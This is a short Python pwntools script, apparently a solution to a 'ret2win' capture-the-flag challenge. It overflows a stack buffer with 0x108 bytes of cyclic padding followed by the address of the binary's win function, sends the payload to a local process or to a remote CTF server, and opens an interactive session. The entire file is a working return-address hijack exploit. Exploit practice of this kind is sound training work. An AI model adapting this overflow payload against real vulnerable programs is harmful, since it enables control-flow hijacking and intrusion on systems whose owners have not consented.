#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('../challenge/out')

def conn():
    if args.REMOTE:
        return remote('ret2win.ctf.ingeniums.club', 1337, ssl=True)
    return elf.process()


r = conn()


pay = cyclic(0x100 + 8)
pay += p64(elf.sym.win)

r.sendlineafter('> ', pay)

r.interactive()
